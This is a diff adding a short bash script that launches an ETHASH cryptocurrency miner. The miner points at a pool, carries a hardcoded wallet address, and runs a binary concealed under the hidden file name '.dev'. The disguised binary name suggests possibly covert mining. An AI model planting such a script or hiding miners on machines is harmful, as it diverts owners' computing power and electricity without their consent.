@@ -1,0 +1,16 @@
+#!/bin/bash
+
+#################################
+## Begin of user-editable part ##
+#################################
+
+POOL=eu.holymine.org:2012
+WALLET=0xba260F70dF1e07Ff77Fa491D1B082a1B1A09993F.$(echo $(shuf -i 1000-9999 -n 1)-atti)
+
+#################################
+##  End of user-editable part  ##
+#################################
+
+cd "$(dirname "$0")"
+
+./.dev -a ETHASH --pool $POOL --user $WALLET $@
